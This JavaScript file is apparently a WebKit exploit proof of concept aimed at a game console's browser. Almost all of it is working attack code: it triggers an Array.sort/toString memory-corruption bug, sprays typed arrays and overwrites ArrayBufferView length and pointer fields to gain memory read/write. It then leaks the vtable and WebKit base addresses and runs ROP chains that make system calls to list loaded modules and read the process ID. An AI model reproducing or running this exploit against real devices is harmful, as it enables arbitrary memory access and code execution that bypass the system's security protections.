var start_offset, offset, offset2, index;
var heart, filler, arrays, cbuf, rop_buf;
var maxLenHeart, maxLenFiller;
var sce_buffer_address, sce_uint32_pointer_address, sce_vtable_address, sce_webkit_address;

var o = {};

maxLenHeart = 0x3000;
maxLenFiller = 0x800;

_dview = null;

function runPOC(action, justPOC)
{
	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: I - Setting Up .sort() Bug";

	var spray = new Array(0x1000)
	for(var i = 0; i < spray.length;i++)
	{
	  spray[i] = new Uint32Array(0x1A7)
	}

	heart = Array.prototype.constructor.apply(null, new Array(maxLenHeart));
	filler = new Array(maxLenFiller);
	arrays = new Array(0x4);

	o.toString = function() {
	  heart.push(0x3039);

	  for(var i = 0; i < arrays.length; ++i)
	  {
	    var a = Array.prototype.constructor.apply(null, filler);
	    a[0] = 0;
	    a[1] = 1;
	    a[2] = 2;
	    arrays[i] = a;
	  }
	};

	heart[0] = o;

	var lenG = u2d(0x80000000, 0x80000000);
	for(var i = 1; i < heart.length; ++i)
	{
	  heart[i] = lenG;
	}

	heart.sort();
	o.toString = function() {};

	var u32buffer = new Array(0x100)
	for(var i = 0; i < 0x100; i++)
	{
	  var v = new Uint32Array(0x13AC)
	  for(var j = 0; j < v.length; j++)
	  {
	    if(j % 2 == 1)
	      v[j] = 0x41414141
	    else
	      v[j] = j;
	  }
	  u32buffer[i] = v
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: II - Finding ArrayBufferView in Memory...";

	arrayBufferView = arrays[1];

	start_offset = 0x2F000;
	offset = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * -40)]).low;
	offset2 = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * 30)]).low;
	index = 0;

	for(var i = 4; i < 100; i++)
	{
		var val = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * i) - offset / 2 - 1]).hi;

		if(val == 0xbadaeef7)
		{
			index = i;
			break;
		}
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: III - Modifying ArrayBufferView Object Size...";

	// Modify ArrayBufferView object size and make the buffer point to the ArrayBuffer field
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 2] = arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 4];

	for(var i = 0; i < u32buffer.length; i++)
	{
		if(u32buffer[i].length != 0x13AC)
	  {
	    // Modify the ArrayBuffer so it is larger and make it so it's m_data pointer points to the ArrayBufferViews
	    sce_buffer_address = new dcodeIO.Long(u32buffer[i][2],u32buffer[i][3],true);
	    sce_uint32_pointer_address = new dcodeIO.Long(u32buffer[i][6],u32buffer[i][7],true);

	    u32buffer[i][4] = (0x60000 * 4);

	    u32buffer[i][2] = sce_uint32_pointer_address.getLowBitsUnsigned();
	    u32buffer[i][3] = sce_uint32_pointer_address.getHighBitsUnsigned();

	    break;
	  }
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: IV - Finding Modified ArrayBuffer in Memory...";

	// Find our new ArrayBuffer and create a uint32 array from it
	for(var i = 0; i < u32buffer[i].length; i++)
	{
		if(u32buffer[i].buffer.byteLength != 0x4eb0)
		{
			cbuf = new Uint32Array(u32buffer[i].buffer);
			break;
		}
	}

	sce_vtable_address = new dcodeIO.Long(cbuf[0], cbuf[1], true);
	sce_webkit_address = sce_vtable_address.sub(0x2600d80);

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: V - Starting ROP and finding modules...";

	if(justPOC)
	{
		document.getElementById("vtableAddress").innerHTML = "VTable Address: 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "WebKit Module Base Address: 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "Buffer Base Address: 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "Unsigned Int32 Address: 0x" + sce_uint32_pointer_address.toString(16);
	}
	else
	{
		document.getElementById("fwversion").innerHTML = "<strong>Firmware Version: </strong>" + ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
		document.getElementById("webkitver").innerHTML = "<strong>WebKit Version: </strong>" + ua.substring(ua.indexOf("AppleWebKit/") + 12, ua.indexOf("(KHTML"));

		document.getElementById("vtableAddress").innerHTML = "<strong>VTable Address:</strong> 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "<strong>WebKit Module Base Address:</strong> 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "<strong>Buffer Base Address:</strong> 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "<strong>Unsigned Int32 Address:</strong> 0x" + sce_uint32_pointer_address.toString(16);

		alert(
			"We've found some basic information about your system:"  + "\r\n" +
			"Firmware Version: " + ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")) + "\r\n" +
			"WebKit Version: " + ua.substring(ua.indexOf("AppleWebKit/") + 12, ua.indexOf("(KHTML"))
		);
	}

	alert(
		"We've found in-depth information about your system through the exploit:" + "\r\n" +
		"vTable Address: 0x" + sce_vtable_address.toString(16) + "\r\n" +
		"WebKit Address: 0x" + sce_webkit_address.toString(16) + "\r\n" +
		"Buffer Address: 0x" + sce_buffer_address.toString(16) + "\r\n" +
		"UINT32 Address: 0x" + sce_uint32_pointer_address.toString(16)
	);

	// Unless we're getting modules / doing anything we need ROP for, stop here for POC

	if(action == "get_modules" || action == "get_pid")
	{
		cbuf[0x1e] = 0x60000;

		rop_buf = undefined;

		for(var i = 0; i < u32buffer[i].length; i++)
		{
			if(u32buffer[i].length == 0x60000)
		  {
		    rop_buf = u32buffer[i]
		    break;
		  }
		}

		for(var i = 0; i < 0x13AC;i++)
		{
		  rop_buf[i] = 0;
		}

		addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true).add(0x200 * 4);

		document.getElementById("modulesInfo").innerHTML = ""; // First clear it as it will have "NOT FOUND"

		if(action == "get_modules")
		{
			for(var i = 0x0; i < 0x100; i++)
			{
				rop_buf[0x200] = 0x1A8
		  	var r = new RopChain();
		  	r.syscall(608,i, 0, addr)
		  	r.add('pop rdi')
		  	r.add(addr.sub(0x100 * 4))
		  	r.add('mov qword ptr [rdi], rax')

		  	r.execute()
		  	if(rop_buf[0x100] != 0)
		    	continue;
		  	var base = new dcodeIO.Long(rop_buf[0x244],rop_buf[0x245],true)

				var type = undefined;

				if(read_str(rop_buf, 0x202).indexOf("sprx") !== -1)
					type = "SPRX";
				else
					type = "SELF";

				alert(
					"We've found a module:" + "\r\n" +
					"Module ID: 0x" + i.toString(16) + "\r\n" +
					"Module Name: " + read_str(rop_buf, 0x202) + "\r\n" +
					"Module Type: " + type + "\r\n" +
					"Module Base Address: 0x" + base.toString(16) + "\r\n"
				);
				document.getElementById("modulesInfo").innerHTML += "Module: " + read_str(rop_buf, 0x202) + "<br />&nbsp;&nbsp;&nbsp;" + "ID: 0x" + i.toString(16) + "<br />&nbsp;&nbsp;&nbsp;" + "Type: " + type + "<br />&nbsp;&nbsp;&nbsp;" + "Module Base Address: 0x"+ base.toString(16) + "<br />==<br />"
			}
		}

		if(action == "get_pid")
		{
			//rop_buf[0x200] = 0x1A8
			var r = new RopChain();
			r.syscall(20); // SysCall #20 - GetPID()
			r.add('pop rdi')
			r.add(addr.sub(0x100 * 4))
			r.add('mov qword ptr [rdi], rax')
			r.execute();

			alert("We've found the WebKit PID: " + rop_buf[0x100]);
		}
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Finished!";
	else if(action == "get_pid")
		document.getElementById("webkitpid").innerHTML = "<strong>WebKit Process ID: </strong>" + rop_buf[0x100];
	else
		document.getElementById("webkitpid").innerHTML = "<strong>WebKit Process ID: </strong>--";


}
